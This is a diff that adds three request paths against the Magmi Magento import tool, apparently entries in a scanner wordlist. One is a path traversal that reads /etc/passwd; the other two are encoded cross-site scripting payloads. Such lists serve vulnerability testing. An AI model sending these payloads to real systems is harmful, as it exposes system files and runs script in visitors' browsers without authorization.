@@ -1,0 +1,3 @@
+/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility
+/magmi/web/magmi.php?configstep=2&profile=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/magmi/web/ajax_gettime.php?prefix=%22%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3C
